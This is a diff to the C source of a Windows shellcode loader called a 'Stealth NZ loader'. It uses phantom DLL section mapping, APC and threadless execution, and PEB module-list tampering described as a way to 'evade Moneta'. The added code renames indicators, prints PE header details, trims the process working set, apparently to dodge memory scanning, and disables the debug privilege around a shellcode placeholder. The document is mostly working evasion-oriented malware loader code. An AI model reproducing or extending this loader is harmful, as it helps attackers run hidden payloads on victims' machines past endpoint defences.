@@ -1,5 +1,5 @@
 /****
- * Stealth NZ loader: a APC write method with custom phantom DLL overloading
+ * Stealth NZ loader: a APC write method with custom module DLL loading
  * Threadless execution
  * With option -ldr to add PEB to module list to evade Moneta
  * Local inejction only 
@@ -592,7 +592,7 @@ namespace dynamic {
         // dynamic::GetModuleHandle = (GetModuleHandlePrototype) find_dll_export(kernel32_base, "GetModuleHandleA");
         // #define _import(_name, _type) ((_type) dynamic::GetProcAddress(dynamic::GetModuleHandle("kernel32.dll"), _name))
         // dynamic::loadFuture = (LoadLibraryPrototype) _import("LoadLibraryW", LoadLibraryPrototype);
-        printf("[+] LoadLibrary at: %p\n by stealth phantom loading", loadFuture);
+        printf("[+] LoadLibrary at: %p\n by stealth module loading", loadFuture);
     }
 }
 ////////////////////////////////////
@@ -1307,6 +1307,7 @@ BOOL EnableWindowsPrivilege(const wchar_t* Privilege) {
 }
 
 
+void DisableDebugPrivilege(); 
 ////////////////////////////////////////
 
 unsigned char magiccode[] = ####SHELLCODE####;
@@ -1462,7 +1463,7 @@ int main(int argc, char *argv[])
         }
     } else {
 
-        printf("[+] Using Phantom DLL with missing PEB (NtCreateSection and NtMapViewOfSection).\n");
+        printf("[+] Using mapped DLL with missing PEB (NtCreateSection and NtMapViewOfSection).\n");
         // Create a section from the file
         // LONG status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
         status = NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
@@ -1494,13 +1495,18 @@ int main(int argc, char *argv[])
     // PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
     // DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
 
-
+    //print fileBase:
+    printf("[+] fileBase: %p\n", fileBase);
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
+    printf("[+] DOS header: %p\n", dosHeader);
     PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
+    printf("[+] NT header: %p\n", ntHeader);
     DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
+    printf("[+] Entry point RVA: %x\n", entryPointRVA);
 
     // Size of the DLL in memory
     SIZE_T dllSize = ntHeader->OptionalHeader.SizeOfImage;
+    printf("[+] DLL size: %lu bytes\n", dllSize);
 
     // Load the DLL to get its base address in current process
     // HMODULE hDll = LoadLibraryW(dllPath); //Normal loading
@@ -1525,8 +1531,8 @@ int main(int argc, char *argv[])
 	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
     
     PVOID dllEntryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)fileBase);
-	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
-    wprintf(L"DLL %ls added to PEB lists\n", dllPath);
+	printf("[+] DLL entry point: %p\n", dllEntryPoint);
+    // wprintf(L"DLL %ls added to PEB lists\n", dllPath);
 
     // Overwrite the AddressOfEntryPoint with magiccode
     // SIZE_T bytesWritten;
@@ -1657,6 +1663,85 @@ int main(int argc, char *argv[])
         }
     }
 
+    // Empty the working set
+    // if (EmptyWorkingSet(GetCurrentProcess())) {
+    //     printf("Successfully emptied the working set.\n");
+    // } else {
+    //     printf("Failed to empty the working set. Error: %d\n", GetLastError());
+    // }
+
+    // Empty the working set
+    if (SetProcessWorkingSetSize(hProcess, 999, 999)) {
+        printf("Working set size reduced to minimal.\n");
+    } else {
+        printf("Failed to set working set size. Error: %d\n", GetLastError());
+    }
+    
+    // DisableDebugPrivilege();
+
+    printf("[+] press any key to continue\n");
+    getchar();
+    
+    // Initial buffer size for QueryWorkingSet
+    DWORD bufferSize = sizeof(PSAPI_WORKING_SET_INFORMATION) + sizeof(PSAPI_WORKING_SET_BLOCK) * 1024;
+    
+    // Allocate a buffer dynamically
+    PPSAPI_WORKING_SET_INFORMATION pWorkingSetInfo = (PPSAPI_WORKING_SET_INFORMATION)VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    if (pWorkingSetInfo == NULL) {
+        printf("Failed to allocate memory. Error: %d\n", GetLastError());
+        return 1;
+    }
+
+    // Query the working set information
+    if (!QueryWorkingSet(hProcess, pWorkingSetInfo, bufferSize)) {
+        DWORD error = GetLastError();
+        if (error == ERROR_INSUFFICIENT_BUFFER) {
+            printf("Buffer too small. Allocating more memory.\n");
+            // Try increasing the buffer size and query again
+            VirtualFree(pWorkingSetInfo, 0, MEM_RELEASE);
+            
+            // Increase buffer size
+            bufferSize *= 2;
+            pWorkingSetInfo = (PPSAPI_WORKING_SET_INFORMATION)VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            
+            if (pWorkingSetInfo == NULL) {
+                printf("Failed to allocate memory after resizing. Error: %d\n", GetLastError());
+                return 1;
+            }
+
+            // Query again with a larger buffer
+            if (!QueryWorkingSet(hProcess, pWorkingSetInfo, bufferSize)) {
+                printf("Failed to query working set again. Error: %d\n", GetLastError());
+                VirtualFree(pWorkingSetInfo, 0, MEM_RELEASE);
+                return 1;
+            }
+        } else {
+            printf("Failed to query working set. Error: %d\n", error);
+            VirtualFree(pWorkingSetInfo, 0, MEM_RELEASE);
+            return 1;
+        }
+    }
+
+    // Iterate through the working set entries and check the Shared and ShareCount values
+    for (DWORD i = 0; i < pWorkingSetInfo->NumberOfEntries; i++) {
+        PSAPI_WORKING_SET_BLOCK block = pWorkingSetInfo->WorkingSetInfo[i];
+
+        // Check Shared and ShareCount values
+        if (block.Shared == 0 || block.ShareCount == 0) {
+            printf("Entry %lu: Shared = %d, ShareCount = %d\n", i, block.Shared, block.ShareCount);
+        }
+    }
+
+    // Print number of entries in the working set
+    printf("Number of entries in working set: %llu\n", pWorkingSetInfo->NumberOfEntries);
+
+
+    printf("[+] press any key to continue\n");
+    getchar();
+    // end of working set size to 0
+    
+    
 
     PIMAGE_DOS_HEADER dosHeader1 = (PIMAGE_DOS_HEADER)fileBase;
     PIMAGE_NT_HEADERS ntHeader1 = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader1->e_lfanew);
@@ -1797,4 +1882,38 @@ BOOL PrintSectionDetails(const wchar_t* dllPath) {
     free(fileBuffer);
     CloseHandle(hFile);
     return TRUE;
+}
+
+
+void DisableDebugPrivilege() {
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+
+    // Open the access token for the current process
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        printf("Failed to open process token. Error: %d\n", GetLastError());
+        return;
+    }
+
+    // Look up the LUID for the debug privilege
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+        printf("Failed to lookup debug privilege. Error: %d\n", GetLastError());
+        CloseHandle(hToken);
+        return;
+    }
+
+    // Disable the privilege by setting its attributes to 0
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = 0;
+
+    // Adjust the token privileges
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+        printf("Failed to adjust token privileges. Error: %d\n", GetLastError());
+    } else {
+        printf("Debug privilege disabled successfully.\n");
+    }
+
+    CloseHandle(hToken);
 }
